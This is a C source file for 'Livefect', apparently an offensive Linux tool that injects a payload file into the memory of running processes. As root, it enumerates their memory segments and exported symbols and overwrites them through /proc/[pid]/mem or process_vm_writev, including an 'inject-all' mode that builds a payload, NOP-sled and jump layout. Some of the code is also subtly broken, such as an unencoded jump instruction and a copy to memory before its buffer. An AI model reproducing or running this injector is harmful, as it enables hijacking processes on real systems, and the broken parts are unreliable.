
#include <Zycore/Status.h>
#include <Zydis/Decoder.h>
#include <Zydis/Encoder.h>
#include <Zydis/Formatter.h>
#include <Zydis/SharedTypes.h>
#include <stddef.h>
#include <stdio.h>    
#include <stdlib.h>   
#include <stdbool.h>  

#include <string.h>   //strcmp, strdup, ...

#include <unistd.h>   //pid_t ...
#include <errno.h>    //errno
#include <getopt.h>   //getopt...
#include <fts.h>      //fts_read...
#include <sys/uio.h>  //iovec, process_vm_writev/readv...
#include <sys/mman.h> //memfd, mmap, etc
#include <fcntl.h>    //open, O_RDONLY, etc
#include <elf.h>      //Elf64_*, Elf32_*
#include <inttypes.h>

#include "match_t.h"
#include "export_t.h"
#include "utils.h"

#define _GNU_SOURCE 1
#define SYMBOL_OPT 1000
#define LIBRARY_OPT 1001
#define DISASM_OPT 1002
#define DISASM_BYTES_OPT 1003

/*Prototypes*/
void set_defaults(args_t*);
void print_usage();

/**Globals*/
const char* program_name;

char* payload = NULL;
size_t payload_len = -1; 

struct iovec remotev[1];        //remote process io vector
struct iovec localv[1];         //local process io vector

/*Arguments*/
args_t args;

int main(int argc, char* argv[]) {
    /*Work variables*/
    match_t* matches=NULL;
    export_t* exports=NULL;

    program_name = argv[0];

    /*Set defaults*/
    set_defaults(&args);

    int opt;
    const char    *short_opts = "hp:emAv:f:a:P:FsDSIV";
    struct option long_opts[] = {
        {"help",          no_argument,             NULL, 'h'},
        {"pid",           required_argument,       NULL, 'p'},
        {"exports",       no_argument,             NULL, 'e'},
        {"maps",          no_argument,             NULL, 'm'},
        {"verbosity",     required_argument,       NULL, 'v'},
        {"file",          required_argument,       NULL, 'f'},
        {"addr",          required_argument,       NULL, 'a'},
        {"perms",         required_argument,       NULL, 'P'},
        {"force",         no_argument,             NULL, 'F'},
        {"skip-root",     no_argument,             NULL, 's'},
       {"data-only",      no_argument,             NULL, 'D'},
       {"func-only",      no_argument,             NULL, 'S'},
       {"inject-all",     no_argument,             NULL, 'I'},
       {"process-vm",     no_argument,             NULL, 'V'},

       {"disasm",         required_argument,       NULL, DISASM_OPT},
       {"disasm-bytes",   required_argument,       NULL, DISASM_BYTES_OPT},

       {"symbol",         required_argument,       NULL, SYMBOL_OPT},
       {"library",         required_argument,       NULL, LIBRARY_OPT},

       {NULL,            0,                       NULL, 0  }
    };

    /*Parse command line options*/
    while ((opt = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) {
        switch (opt) {
            case 'p':
                args.arg_pid = atoi(optarg);
            break;
            case 'e':
                args.arg_list_exports = true;
            break;
            case 'm':
                args.arg_list_maps = true;
            break;
            case 'v':
                args.arg_verbosity = atoi(optarg);
            break;
            case 'f':
                args.arg_payload_path = optarg;
            break;
            case 'a':
                args.arg_raddr = (void*)strtol(optarg, NULL, 0);
            break;
            case 'P':
                if(strlen(optarg)<1) {
                    fprintf(stderr, "[E] Wrong permissions lenght. Use \"rwxp\" (e.g. r-xp).\n");
                    return EXIT_FAILURE;
                }

                for(int i=0;i<strlen(args.arg_perms);i++) {
                    char c = optarg[i];
                    if(c=='r' || c=='w' || c=='x' || c=='-' || c=='p' || c=='s' || c=='*') {
                        args.arg_perms[i]=c;
                    } else {
                        fprintf(stderr, "[E] Unknown permission used.\n");
                        return EXIT_FAILURE;
                    }
                }
            break;
            case 'F':
                args.arg_force_disk = true;
            break;
            case 's':
                args.arg_skip_root = true;
            break;
            case 'D':
                //mutually exclusive (-D or -S)
                args.arg_func_only = false;
                args.arg_data_only = true;
            break;
            case 'S':
                //mutually exclusive (-D or -S)
                args.arg_data_only = false;
                args.arg_func_only = true;
            break;
            case 'I':
                args.arg_inject_all=true;
            break;
            case 'V':
                args.arg_process_vm=true;
            break;
            case DISASM_OPT: //long only option
                args.arg_disasm = atoi(optarg);
                args.arg_list_maps = true;
            break;
            case DISASM_BYTES_OPT: //long only option
                args.arg_disasm_bytes = atoi(optarg);
                args.arg_list_maps = true;
            break;
            case SYMBOL_OPT: //long only option
                args.arg_symbol_filter = optarg;
            break;
            case LIBRARY_OPT: //log only option
                args.arg_library_filter = optarg;
            break;
            default:
            case 'h':
                args.arg_show_usage = true;
        }
    }

    /*Quit early conditions*/
    if(args.arg_show_usage) {
        print_usage();
        return EXIT_SUCCESS;
    }

    if(getuid() != 0 && !args.arg_skip_root) {
        fprintf(stderr, "[E] Run me as root.\n");
        return EXIT_FAILURE; 
    }

    if(args.arg_payload_path) {
        int fd = open(args.arg_payload_path, O_RDONLY);
        if(fd == -1) {
            fprintf(stderr, "[E] Error opening file: %s (errno: %d)\n", args.arg_payload_path, errno);
            return EXIT_FAILURE;
        }

        payload_len = lseek(fd, 0, SEEK_END);
        lseek(fd, 0, SEEK_SET); //rewind

        payload = (char*)malloc(payload_len);
        read(fd, payload, payload_len);
        close(fd);

        printf("[*] Loaded payload from: %s (%lu bytes)\n", args.arg_payload_path, payload_len);

        //We always use the same payload so source, source size and destination size never change
        localv[0].iov_base = payload;
        localv[0].iov_len = payload_len;
        remotev[0].iov_len = payload_len;
    }

    /*Run*/
    if(args.arg_raddr) {
        if(args.arg_pid < 0) {
            fprintf(stderr, "[E] Raw mode can only be used against a sigle pid!\n");
            return EXIT_FAILURE;
        }

        if(payload==NULL) {
            fprintf(stderr, "[E] Must specify payload to write (-f)!\n");
            return EXIT_FAILURE;
        }
        
        //RAW MODE
        if(write_payload(args.arg_pid, payload, payload_len, args.arg_raddr, &args) == -1) {
            fprintf(stderr, "[E] Failed writing payload. (errno: %d)\n", errno);
            free(payload);
            return EXIT_FAILURE;
        }

        free(payload);
        return EXIT_SUCCESS;
    }

    //We are not running in raw mode, collect matching segments
    printf("[~] Searching interesting segments...\n");
    matches = find_segments(args.arg_pid, args.arg_perms, matches, &args);
    if(args.arg_verbosity>0)
        printf("[~] Collecting exports...\n");
    exports = find_exports(matches, args.arg_force_disk, exports, &args);

    if(args.arg_list_maps||args.arg_list_exports) {
        //Check if we have any results, if so iterate through them
        if(args.arg_list_maps) {
            if(matches) { 
                match_t* current = matches;
                printf("[=] Found segments:\n");
                while(current) {
                    char* cmdline = (char*)get_cmdline(current->pid);
                    printf("\t[+] Match (%s) for pid %d (%s) @ <%s>:%p-%p\n", current->perms, current->pid, cmdline, current->path, current->start, current->end);
                    free(cmdline);

                    if(args.arg_disasm > 0) { 
                        size_t count = 0;
                        struct iovec ioremote[1];        //remote process io vector
                        struct iovec iolocal[1];         //local process io vector

                        void* code_buf = (void*) malloc(args.arg_disasm_bytes); //this should be read with process_vm_readv

                        ioremote->iov_base=current->start;
                        ioremote->iov_len=args.arg_disasm_bytes;
                        iolocal->iov_base=code_buf;
                        iolocal->iov_len=args.arg_disasm_bytes;

                        int nread = process_vm_readv(current->pid, iolocal, 1, ioremote, 1, 0);
                        if(nread==-1) {
                            fprintf(stderr, "\t\t[E] Failed reading %d bytes @ %p from remote process %d. (errno: %d)\n", args.arg_disasm_bytes, current->start, current->pid, errno);
                            free(code_buf);
                            current = current->next;
                            continue;
                        }

                        ZydisDecoder decoder;
                        ZydisDecoderInit(&decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);

                        ZydisFormatter formatter;
                        ZydisFormatterInit(&formatter, ZYDIS_FORMATTER_STYLE_INTEL); //TODO: support AT&T syntax via env variable,flag or something? 
                        
                        ZyanU64 runtime_address = (unsigned long)(current->start);
                        ZyanUSize offset = 0;
                        const ZyanUSize length = args.arg_disasm_bytes;
                        ZydisDecodedInstruction instruction;
                        ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT];
                        while (ZYAN_SUCCESS(ZydisDecoderDecodeFull(&decoder, code_buf + offset, length - offset, &instruction, operands)) && 
                               count < args.arg_disasm) {
                            // Print current instruction pointer.
                            printf("\t\t%016" PRIX64 "  ", runtime_address);

                            // Format & print the binary instruction structure to human-readable format
                            char buffer[256];
                            ZydisFormatterFormatInstruction(&formatter, &instruction, operands,
                                instruction.operand_count_visible, buffer, sizeof(buffer), runtime_address, ZYAN_NULL);
                            puts(buffer);

                            offset += instruction.length;
                            runtime_address += instruction.length;
                            count++;
                        }
                    }
                    
                    current = current->next;
                }
            } else {
                printf("[-] No matches found for provided permissions.\n");
                return EXIT_FAILURE;
            }
        }

        if(args.arg_list_exports){
            if(exports) {
                export_t* current = exports;

                printf("[=] Found exports:\n");
                while(current) {
                    //TODO: fix this, it displays wrong offsets and perms from exports
                    printf("\t[+] Export for pid %d (%s) %s @ %p-%p\n", current->pid, current->perms, current->name, current->addr, current->addr+current->len);
                    current = current->next;
                }
            } else {
                printf("[-] No exports found.\n");
                return EXIT_FAILURE;
            }
        } 

        return EXIT_SUCCESS;
    }

    /*Check if we can do all the bad stuff*/
    if(matches==NULL) {
        printf("[-] No segments found.\n");
        return EXIT_FAILURE;       
    }
    if(exports==NULL && !args.arg_inject_all) {
        printf("[-] No exports found.\n");
        return EXIT_FAILURE;
    }
    
    /*Do all the bad stuff we can*/
    int injected = 0;
    if(args.arg_inject_all) {
        fprintf(stderr, "[W] Ignoring exports, injecting into matching memory segments only!\n");
        
        //WIP: we should also attempt write to segments
        //Write to any matching memory segment
        match_t* current_m = matches;
        size_t segment_size = 0;
        void* to_write = NULL;

        while(current_m) {
            //Layout:
            //  PAYLOAD
            //  NOPSLED
            //  JMP &PAYLOAD
            segment_size = current_m->end - current_m->start;
            
            to_write = malloc(segment_size);
            if(to_write == NULL) {
                fprintf(stderr, "[E] Failed to prepare buffer (malloc) (errno: %d).\n", errno);
                continue;
            }

            if(ZYAN_FAILED(ZydisEncoderNopFill(to_write, segment_size))) {
                fprintf(stderr, "[E] Failed to prepare buffer (nop spray) @ %p (errno: %d).\n", to_write, errno);
                free(to_write);
                continue;
            }

            if(memcpy(to_write, payload, payload_len) == NULL) {
                fprintf(stderr, "[E] Failed to prepare buffer (payload) @ %p (errno: %d).\n", to_write, errno);
                free(to_write);
                continue; 
            }
            
            ZydisEncoderRequest req;
            memset(&req, 0, sizeof(req));

            req.mnemonic = ZYDIS_MNEMONIC_JMP;
            req.machine_mode = ZYDIS_MACHINE_MODE_LONG_64;
            req.operand_count = 1;
            req.operands[0].type = ZYDIS_OPERAND_TYPE_IMMEDIATE;
            req.operands[0].imm.u = (unsigned long) current_m->start;

            ZyanU8 encoded_instruction[ZYDIS_MAX_INSTRUCTION_LENGTH];
            ZyanUSize encoded_length = sizeof(encoded_instruction);

            //Write jmp to prepared buffer
            if(memcpy(to_write-encoded_length, encoded_instruction, encoded_length) == NULL) {
                fprintf(stderr, "[E] Failed to prepare buffer (jmp) @ %p (errno: %d).\n", to_write, errno);
                free(to_write);
                continue; 
            }

            if(args.arg_verbosity>0)
                printf("[.] Attempting payload write of %s (%lu bytes) to PID: %d from %p to %p...\n", args.arg_payload_path, segment_size, current_m->pid, current_m->start, current_m->start+segment_size);
                
            if(write_payload(current_m->pid, to_write, segment_size, current_m->start, &args) == -1) {
                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current_m->start, errno);
            } else {
                injected++;
            }

            //free(to_write); //TODO: why is this an invalid malloc'ed ptr?? free(): invalid pointer

            current_m = current_m->next;
        }
    } else if(args.arg_payload_path != NULL) {
        //Write to any matching exports.
        export_t* current_e = exports;
        while(current_e) {
            if(args.arg_verbosity>0)
                printf("[.] Attempting write of %s (%lu bytes) to PID: %d -> '%s' @ %p...\n", args.arg_payload_path, payload_len, current_e->pid, current_e->name, current_e->addr);

            int err = write_payload(current_e->pid, payload, payload_len, current_e->addr, &args);
            if (err == -1) {
                fprintf(stderr, "[E] Failed to call write_payload @ %p (errno: %d).\n", current_e->addr, errno);
            } else {
                injected++;
            }

            current_e=current_e->next;
        }
    }

    //If we injected to at least 1 process it's a win
    if(injected>0) {
        printf("[*] Yay! Successfully Wrote payload to %d locations!\n", injected);
        return EXIT_SUCCESS;
    } else {
        printf("[-] Boo! No payloads written.\n");
        return EXIT_FAILURE;
    }
}

void print_usage() {
    printf("Livefect = Infect live, running processes\n");

    printf("Usage: %s [opts]\n", program_name);
    printf("\t-h --help:              show this help message\n");
    
    printf("\t-V --process-vm:        use process_vm_writev instead of /proc/[pid]/mem\n");
    printf("\t-p --pid PID:           run against specified pid (default: NULL)\n");
    printf("\t-f --file FILE:         file containing data to write/payload (default: NULL)\n");
    printf("\t-a --addr ADDR:         (raw mode) address to write data/payload to\n");
    printf("\t-v --verbosity LEVEL:   set verbosity level (default: 0)\n");
    printf("\t-P --perms PERMS:       which permissions to look for (default: rwxp)\n");
    printf("\t-S --func-only:         only display function symbols\n");
    printf("\t   --symbol SYMBOL:     write FILE to all symbols with name SYMBOL\n");
    printf("\t   --library LIBRARY:   to use with --symbol allow write to specific SYMBOL from specific LIBRARY\n");
    printf("\t-D --data-only:         only display data symbols\n");
    printf("\t-I --inject-all:        (potentially unsafe) force payload injection in any matching memory area\n");

    printf("\t-m --maps:              only list memory maps\n");
    printf("\t   --disasm N:          (implies -m) try disassemble the first N instructions and show output (default: 0)\n");
    printf("\t   --disasm-bytes N:    (implies -m) bytes to pass to disassembler (default: 64)\n");

    printf("\t-e --exports:           only list exported functions\n");
    printf("\t-F --force-disk:        force ELF exports lookup from disk\n");

    printf("\t-s --skip-root:         do not enforce root checks\n");
    
    //TODO: check if there's a process_vm_mmap or similar to change maps permissions before writing and add option to do so
    //https://man7.org/linux/man-pages/man2/pidfd_open.2.html
    //https://lwn.net/Articles/830648/
    printf("\nMade while screaming in *PANIC* by @thatsn0mysite (https://thatsn0tmy.site)\n");
}

void set_defaults(args_t* args) {
    args->arg_pid = -1;                                      //pid 
    args->arg_payload_path = NULL;                           //path to file containing payload
    args->arg_list_exports = false;                          //only list exports
    args->arg_list_maps = false;                             //only list maps
    args->arg_show_usage = false;                            //show help
    args->arg_force_disk = false;                            //force lookup of exported symbols from disk
    args->arg_skip_root = false;                             //skip root checks
    args->arg_inject_all = false;                            //inject payload into ALL matching memory areas 
    args->arg_verbosity = 0;                                 //verbosity level
    args->arg_disasm = 0;                                    //instructions to disassemble
    args->arg_disasm_bytes = 64;                             //bytes to pass to disassemble
    args->arg_raddr = NULL;                                  //remote address to write at in case of raw option
    args->arg_perms[0] = 'r';                                //permissions to look for
    args->arg_perms[1] = 'w';                                //permissions to look for
    args->arg_perms[2] = 'x';                                //permissions to look for
    args->arg_perms[3] = '*';                                //permissions to look for
    args->arg_data_only = false;                             //only show data symbols
    args->arg_process_vm = false;                            //attempt writes using process_vm_writev
    args->arg_func_only = false;                             //only show func symbols
    args->arg_symbol_filter = NULL;                          //symbol name to filter for
    args->arg_library_filter = NULL;                         //library name to filter for
}